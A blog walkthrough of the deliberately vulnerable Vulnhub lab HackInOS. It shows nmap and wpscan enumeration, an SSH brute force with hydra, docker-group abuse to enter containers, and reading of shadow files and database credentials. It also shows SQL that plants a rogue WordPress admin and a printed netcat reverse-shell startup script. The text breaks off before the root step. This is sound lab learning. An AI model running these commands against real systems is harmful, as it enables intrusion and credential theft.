+++
author = "Chris Suttles"
categories = ["pentesting", "metasploit", "CTF", "BootToRoot", "security", "vulnhub"]
date = 2019-04-26T07:42:00Z
description = ""
draft = false
cover = "/images/2019/04/HackInOS-00.png"
slug = "hackinos-boot-to-root"
tags = ["pentesting", "metasploit", "CTF", "BootToRoot", "security", "vulnhub"]
title = "HackInOS Boot to Root"

+++


A few friends and I have been getting together to play around with Pentesting, and one of our recent adventures was [HackInOS from Vulnhub](https://www.vulnhub.com/entry/hackinos-1,295/). Here's the author's description of this vulnerable machine:

> HackinOS is a beginner level CTF style vulnerable machine. I created this VM for my university’s cyber security community and all cyber security enthusiasts. I thank to Mehmet Oguz Tozkoparan, Ömer Faruk Senyayla and Tufan Gungor for their help during creating this lab.

## Enumeration

Since this is just a "boot to root", not a full pentest, we jump right into enumeration after some simple environment setup. After all of us found our local box's IP, we all create an entry in `/etc/hosts` called 'target' that corresponds to the box. This helps because we use a shared document for notes and it makes a lot of commands re-usable for everyone since everybody's local vbox/vmware/whatever setup is a little different.

### nmap

I typically do nmap from within metaspolit so I can save the info in the workspace and get to it easily. Since we don't have to worry about detection, I did a very aggressive nmap to enumerate the target.

```
msf5 > db_nmap -sV -O -A -p- target
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-21 19:12 EDT
[*] Nmap: Nmap scan report for hackin (192.168.167.132)
[*] Nmap: Host is up (0.00073s latency).
[*] Nmap: Not shown: 65533 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
[*] Nmap: |   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
[*] Nmap: |_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
[*] Nmap: 8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
[*] Nmap: |_http-generator: WordPress 5.0.3
[*] Nmap: |_http-open-proxy: Proxy might be redirecting requests
[*] Nmap: | http-robots.txt: 2 disallowed entries
[*] Nmap: |_/upload.php /uploads
[*] Nmap: |_http-server-header: Apache/2.4.25 (Debian)
[*] Nmap: |_http-title: Blog &#8211; Just another WordPress site
[*] Nmap: MAC Address: 00:0C:29:AC:13:E4 (VMware)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X|4.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
[*] Nmap: OS details: Linux 3.2 - 4.9
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.73 ms hackin (192.168.167.132)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.29 seconds

```

As usual, nmap provides a helpful starting point. We also ran a similar UDP scan, but that didn't turn up anything interesting so it has been omitted. From here, we started to drill down on the two exposed services.

### HTTP

We can get some hints from `robots.txt`

```
root@kali:~# curl target:8000/robots.txt
User-agent:*
Disallow:/upload.php
Disallow:/uploads
```

We took a closer look at the disallowed entries, and found some interesting stuff; `upload.php` has an html comment in it:[https://github.com/fatihhcelik/Vulnerable-Machine---Hint](https://github.com/fatihhcelik/Vulnerable-Machine---Hint)

We've also got an old wordpress installation to hack on.

### SSH

We didn't do anything in the way of enumeration for SSH beyond the nmap scan to find it's listening and the version, etc.

## Attack Start / Getting a Foothold

There's still some enumeration along the way here, but we started going for it since we apparently only had two services to work on.

### HTTP

### dirb

I ran dirb to enumerate HTTP, as did "SteveyDevey", and we didn't come up with anything exciting, since we found everything interesting already via nmap and looking at robots.txt. It's still a great tool and we used it, so yeah, that happened and we kept going. This kind of thing is very common in pentest/CTF; if it was easy and everything worked all the time there would be no point.

> If being awesome was easy, everyone would do it.

### uploads.php

We spent some time digging through the github link that my pal "SteveyDevey" found, and tried to figure out how to upload a payload and where it would go. That was a pretty fun puzzle, but we never got there. I think it's possible to exploit via HTTP if you can craft a payload that passes the mime type check, and then hit it with a GET after calculating the location in uploads. One test we did was to upload a simple gif, named 'avacado.gif' (sic, I can't spell). The actual location of that file ended up being:

http://target:8000/uploads/476ce8b1f89f8e46c4087d7b524eabee.gif

_edit: see the "bonus section" at the end of this post for details on this; I chose to revisit it and figured it out_

### Wordpress

Everyone's favorite blogging platform has had it's share of exploits over the years, so this was where I focused while "SteveyDevey" was working on `uploads.php`.

Browsing to the site, it looked very broken. This is because of a common configuration error in wordpress, where the install URL is configured as "localhost". To fix things up, I started a local port redirect with socat:

```
socat tcp-listen:8000,reuseaddr,fork tcp:target:8000
```

This made it possible to follow links and explore manually, and fixed the style errors as well.

Manual discovery and attacking is great, but there'a tools to make this easier; enter `wpscan`.

After a couple wpscan runs, we had a lot more detail about this WP install to use for attacking, and a user (although we already discovered that user manually).

```
root@kali:~# wpscan --url http://target:8000/ --wp-content-dir /                                                                                                                                                                                                                          
_______________________________________________________________                                                                                                                                                                                                                           
        __          _______   _____                                                                                                                                                                                                                                                       
        \ \        / /  __ \ / ____|                                                                                                                                                                                                                                                      
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                                                                                                     
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                                                                                                                                      
           \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                                                                                                     
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                          
        WordPress Security Scanner by the WPScan Team                                                                                                                                                                                                                                     
                       Version 3.5.1                                                                                                                                                                                                                                                      
          Sponsored by Sucuri - https://sucuri.net                                                                                                                                                                                                                                        
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_                                                                                                                                                                                                                                   
_______________________________________________________________                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                                                          
[+] URL: http://target:8000/                                                                                                                                                                                                                                                              
[+] Started: Sun Apr 21 19:33:32 2019                                                                                                       
                                                                  
Interesting Finding(s):

[+] http://target:8000/
 | Interesting Entries:
 |  - Server: Apache/2.4.25 (Debian)
 |  - X-Powered-By: PHP/7.2.15
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://target:8000/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://target:8000/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://target:8000/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://target:8000/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.3 identified (Insecure, released on 2019-01-09).
 | Detected By: Emoji Settings (Passive Detection)
 |  - http://target:8000/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://target:8000/, Match: 'WordPress 5.0.3'
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 5.04
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9230
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================================================================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.


[+] Finished: Sun Apr 21 19:33:33 2019
[+] Requests Done: 40
[+] Cached Requests: 8
[+] Data Sent: 6.032 KB
[+] Data Received: 18.762 KB
[+] Memory used: 138.477 MB
[+] Elapsed time: 00:00:01
```

And here's our wordpress user:

```
root@kali:~# wpscan --url http://target:8000/ --wp-content-dir / --enumerate u 

...snip...

[i] User(s) Identified:

[+] handsome_container
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

Surely, a username like that is some kind of clue.I started poking wordpress manually, and tried to register, but registration was not enabled. I also tried to post replies to existing comments to see if we could use that for the CSRF vulnerability wpscan found, but although my posts seemed successful, they were not visible, which means that CSRF would not work, since it needs a page load to occur for the CSRF to run. While it is already in the wpscan output above, I think it's worthwhile to point out [this blog post](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/); it's an excellent write up.SSH

I didn't feel like we were making progress with the HTTP based attacks, so I decided to switch gears and try SSH.

{{< figure src="/content/images/2019/04/HackInOS-01-1.png" caption="hummingbirdscyber" >}}

The box boots to a login screen that shows a valid user. I decided to plug this user into hydra and attack SSH, and it payed off after just a few seconds.

```
root@kali:~# hydra -l hummingbirdscyber -P /usr/share/wordlists/rockyou.txt -t4 target ssh 
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-22 20:10:29
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://target:22/
[22][ssh] host: target   login: hummingbirdscyber   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-22 20:10:43
root@kali:~# 
```

Well ok, I'll take an unprivileged shell. Thanks, Hydra!`[22][ssh] host: target   login: hummingbirdscyber   password: 123456`

## Unprivileged Shell

Now we had an unprivileged shell, and it was time to do some additional enumeration. I started by grabbing /etc/passwd and checking the user's group memberships.

```
hummingbirdscyber@vulnvm:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
hummingbirdscyber:x:1000:1000:hummingbirdscyber,,,:/home/hummingbirdscyber:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin


hummingbirdscyber@vulnvm:~$ grep -vP 'nologin|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
hummingbirdscyber:x:1000:1000:hummingbirdscyber,,,:/home/hummingbirdscyber:/bin/bash
```

I also poked around the user's home directory for things of interest:

```
hummingbirdscyber@vulnvm:~$ stat .sudo_as_admin_successful
  File: '.sudo_as_admin_successful'
  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
Device: 801h/2049d      Inode: 543323      Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/hummingbirdscyber)   Gid: ( 1000/hummingbirdscyber)
Access: 2019-04-22 22:13:48.853931517 +0300
Modify: 2019-02-23 14:04:35.780726236 +0300
Change: 2019-02-23 14:04:35.780726236 +0300
 Birth: -
hummingbirdscyber@vulnvm:~$ sudo -l 
[sudo] password for hummingbirdscyber: 

Sorry, user hummingbirdscyber may not run sudo on vulnvm.
```

I decided I wanted to speed things up a bit, and found a neat tool in this ["total OSCP guide"](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html), called [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). I read that, put it on the target machine, ran it, and read through the output. I found some interesting stuff there. Rather than paste all the output, here's the two things that jumped out at me:

```
hummingbirdscyber@vulnvm:~$ ls Desktop/a.out -l 
-rwsr-xr-x 1 root root 8720 Mar  1 23:25 Desktop/a.out
hummingbirdscyber@vulnvm:~$ 


hummingbirdscyber@vulnvm:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
```

I already saw that `hummingbirdscyber` was a member of the `docker` group, but I missed the `adm` membership. I tried some additional find commands to look for SUID files I could abuse with `-gid 4`, but no luck. It's also worth mentioning that the output led me to look for gcc, which was installed.

## Docker

With membership in the `docker` group, we could really dig into the containers on this box and see if we can abuse that privilege for gain. We start again, with more enumeration:

```
hummingbirdscyber@vulnvm:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
252fa8cb1646        ubuntu              "/bin/bash"              8 weeks ago         Up 19 minutes                              brave_edison
1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   8 weeks ago         Up 19 minutes       0.0.0.0:8000->80/tcp   experimental_wordpress_1
81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   8 weeks ago         Up 19 minutes       3306/tcp, 33060/tcp    experimental_db_1
```

This really helped to bring the environment into focus for me. All the stuff we were hammering on via HTTP lived in a container; remember that username hint, `handsome_container`?

### Ubuntu / brave_edison

I started with this container, since I suspected it would be the most "complete" environment. Once I exec'd into the container, I started to get a clearer picture of what we were working with. I looked at the running processes and started poking things:

```
hummingbirdscyber@vulnvm:~$ docker exec -it brave_edison /bin/bash
root@252fa8cb1646:/# cat /etc/init.d/port.sh 
#!/bin/bash

while [ 1 ];do nc 1afdd1f6b82c 7777 -e /bin/bash;sleep 5;done
root@252fa8cb1646:/# cat /etc/init.d/ftp.sh  
#!/bin/bash

/root/proftpd-1.3.3c/proftpd -n -d 5 -c /tmp/PFTEST/PFTEST.conf

root@252fa8cb1646:/# ps -ef 
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 19:08 pts/0    00:00:00 /bin/bash
root         10      0  0 19:08 ?        00:00:00 /bin/bash /etc/init.d/port.sh
root         17      0  0 19:08 ?        00:00:00 /bin/bash /etc/init.d/ftp.sh
root         22     17  0 19:08 ?        00:00:00 proftpd: (accepting connections)
root       1289      0  0 20:00 pts/1    00:00:00 /bin/bash
root       1327     10  0 20:01 ?        00:00:00 sleep 5
root       1328   1289  0 20:01 pts/1    00:00:00 ps -ef
root@252fa8cb1646:/# 
root@252fa8cb1646:~# ls
flag  proftpd-1.3.3c  ssh_cred
root@252fa8cb1646:~# cat flag 
Wake Up!
root@252fa8cb1646:~# cat ssh_cred 
hummingbirdscyber:123456

root@252fa8cb1646:/# cat /tmp/PFTEST/PFTEST.xferlog 
Thu Feb 28 20:28:30 2019 0 ::ffff:172.18.0.3 78 /etc/init.d/ftp.sh b _ o r proftpd ftp 0 * c
Thu Feb 28 20:48:15 2019 0 ::ffff:172.18.0.3 16 /home/hint b _ o r proftpd ftp 0 * c
root@252fa8cb1646:/# ls /home/hint 
/home/hint
root@252fa8cb1646:/# cat /home/hint 
Startup Script?
root@252fa8cb1646:/# 
```

This output made me start thinking that perhaps direct ssh was not the vulnerable machine's common ingress point, and that maybe I should not have used the visible username to my advantage to get a foothold. I also thought "why turn back now that I already have a shell?" a few seconds later.

### Wordpress / experimental_wordpress_1

Oh boy. With a name like that, this thing must be swiss cheese, right?

```
hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
root@1afdd1f6b82c:/var/www/html# ls
index.php    robots.txt  wp-activate.php     wp-comments-post.php  wp-content	wp-links-opml.php  wp-mail.php	    wp-trackback.php
license.txt  upload.php  wp-admin	     wp-config-sample.php  wp-cron.php	wp-load.php	   wp-settings.php  xmlrpc.php
readme.html  uploads	 wp-blog-header.php  wp-config.php	   wp-includes	wp-login.php	   wp-signup.php
root@1afdd1f6b82c:/var/www/html# cat wp-config
cat: wp-config: No such file or directory
root@1afdd1f6b82c:/var/www/html# grep -i DB wp-config.php 
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'db:3306');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
define('AUTH_KEY',         'b68c5e8cad4c8f8367efe2db89d7865e894d037d');
define('AUTH_SALT',        'dbf7b92510a931b835a8b82eec8fd1adbaad487f');
define('LOGGED_IN_SALT',   '614056ec3ba0011dcdb83422b44238045627750e');
root@1afdd1f6b82c:/var/www/html# 
root@1afdd1f6b82c:/var/www/html# cd uploads/
root@1afdd1f6b82c:/var/www/html/uploads# ls 
476ce8b1f89f8e46c4087d7b524eabee.gif
root@1afdd1f6b82c:/var/www/html/uploads# 
```

Kinda. It was trivial to get the wordpress db creds, and this is how I confirmed the location of my test upload. We tried re-implementing the php move of the `uploads.php` in bash earlier, and then started using php from the cli to guess paths. We weren't sure if we were right about the renaming until I got into this container and confirmed it.That doesn't do us much good though, since we didn't have a payload that would pass the mime type check to upload, and even if we did, it would get us access to a container where we already had access!I kept looking and saw another clue to the same moot point:

```
hummingbirdscyber@vulnvm:~$ docker exec  -it experimental_wordpress_1 /bin/bash
root@1afdd1f6b82c:/var/www/html# ps -ef  
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 19:08 ?        00:00:00 apache2 -DFOREGROUND
root         35      0  0 19:08 ?        00:00:00 /bin/bash /etc/init.d/delete.sh
www-data     94      1  0 19:08 ?        00:00:00 apache2 -DFOREGROUND
www-data     95      1  0 19:08 ?        00:00:00 apache2 -DFOREGROUND
www-data     97      1  0 19:08 ?        00:00:00 apache2 -DFOREGROUND
www-data     98      1  0 19:08 ?        00:00:00 apache2 -DFOREGROUND
www-data    124      1  0 19:33 ?        00:00:00 apache2 -DFOREGROUND
www-data    126      1  0 19:34 ?        00:00:00 apache2 -DFOREGROUND
www-data    141      1  0 19:44 ?        00:00:00 apache2 -DFOREGROUND
www-data    143      1  0 19:44 ?        00:00:00 apache2 -DFOREGROUND
www-data    144      1  0 19:44 ?        00:00:00 apache2 -DFOREGROUND
www-data    146      1  0 19:44 ?        00:00:00 apache2 -DFOREGROUND
root        174     35  0 19:58 ?        00:00:00 sleep 300
root        184      0  1 20:02 pts/0    00:00:00 /bin/bash
root        189    184  0 20:02 pts/0    00:00:00 ps -ef

root@1afdd1f6b82c:/var/www/html# cat /etc/init.d/delete.sh 
#!/bin/bash

while [ 1 ]
do
    rm -rf /var/www/html/uploads/*.php
    sleep 300
done
```

Again, I thought that we were probably intended to get a foothold through HTTP. Oh well.

```
hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
root@1afdd1f6b82c:/var/www/html# cd /root/
root@1afdd1f6b82c:~# ls
flag
root@1afdd1f6b82c:~# cat flag 
Life consists of details..
```

Poking around some more got me some more fortune cookie wisdom and a lot of nothing. I grabbed passwd and shadow for kicks.

```
hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
root@1afdd1f6b82c:/var/www/html# cat /etc/shadow
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
daemon:*:17931:0:99999:7:::
bin:*:17931:0:99999:7:::
sys:*:17931:0:99999:7:::
sync:*:17931:0:99999:7:::
games:*:17931:0:99999:7:::
man:*:17931:0:99999:7:::
lp:*:17931:0:99999:7:::
mail:*:17931:0:99999:7:::
news:*:17931:0:99999:7:::
uucp:*:17931:0:99999:7:::
proxy:*:17931:0:99999:7:::
www-data:*:17931:0:99999:7:::
backup:*:17931:0:99999:7:::
list:*:17931:0:99999:7:::
irc:*:17931:0:99999:7:::
gnats:*:17931:0:99999:7:::
nobody:*:17931:0:99999:7:::
_apt:*:17931:0:99999:7:::

root@1afdd1f6b82c:/var/www/html# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

I thought "no way are these mapped to actual system files", and I was right.

```
root@kali:~/hackinos# john --show unshadowed
root:john:0:0:root:/root:/bin/bash

1 password hash cracked, 0 left
```

I tried using that to become root on the host, but that didn't work. duh.

### MySQL / experimental_db_1

I started out by poking around the database with the creds we harvested from the wordpress container.

```
hummingbirdscyber@vulnvm:~$ docker exec -it experimental_db_1 /bin/bash

root@81a93420fd22:/# mysql -u wordpress -p wordpress 
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.25 MySQL Community Server (GPL)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;'
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| host_ssh_cred         |
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)

mysql> desc wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> select * from wp_users\G
*************************** 1. row ***************************
                 ID: 1
         user_login: Handsome_Container
          user_pass: $P$BXJ8ZmtYd5lHZOLPgTccLUhaQLxm0L0
      user_nicename: handsome_container
         user_email: pupetofosu@ask-mail.com
           user_url: 
    user_registered: 2019-02-23 15:49:54
user_activation_key: 
        user_status: 0
       display_name: Handsome_Container
1 row in set (0.00 sec)
```

It won't get us anything, but let's get access to wordpress for fun!

Here's some articles I found to help craft the right queries and hash a password so I could create a new wordpress admin user:

[https://jakebillo.com/wordpress-phpass-generator-resetting-or-creating-a-new-admin-user/](https://jakebillo.com/wordpress-phpass-generator-resetting-or-creating-a-new-admin-user/)

[http://scriptserver.mainframe8.com/wordpress_password_hasher.php](http://scriptserver.mainframe8.com/wordpress_password_hasher.php)

[https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/](https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/)

```
root@kali:~# cat wordpress-add-admin-user.sql
INSERT INTO `wordpress`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('2', 'attacker', '$P$BQz2Dd0FIn7hf90kXbo2G2uwiMCgTH.', 'Real Mature', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Real Mature');
 
INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_user_level', '10');

mysql> INSERT INTO `wordpress`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('2', 'attacker', '$P$BQz2Dd0FIn7hf90kXbo2G2uwiMCgTH.', 'Real Mature', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Real Mature');
Query OK, 1 row affected (0.01 sec)

mysql> INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
Query OK, 1 row affected (0.01 sec)

mysql> INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_user_level', '10');
Query OK, 1 row affected (0.00 sec)
```

{{< figure src="/content/images/2019/04/Screenshot-from-2019-04-22-20-50-31.png" >}}

Once I logged in as our new admin user, I could see my previous attempts to post comments stuck, awaiting moderation.

## Take a Step Back / Retrace Steps

With the access to all the containers, and wordpress, we could easily execute the CSRF exploit we found with wpscan, but we would gain nothing. Perhaps the intended way in wasn't CSRF, but the uploads route; again this would gain us nothing. The ssh creds were in plain text on the ubuntu container, which was connected to the wordpress container. Perhaps the intended route was to exploit wordpress via sqlmap to get CSRF capability, then use that RCE to get access to wordpress, then pivot to the ubuntu container, where we would find the hosts's SSH creds in plain text. It was too late for all that. Where do we go now?

## Get Root

We found some (probably false) flags and a lot of hints. Remember this one?

```
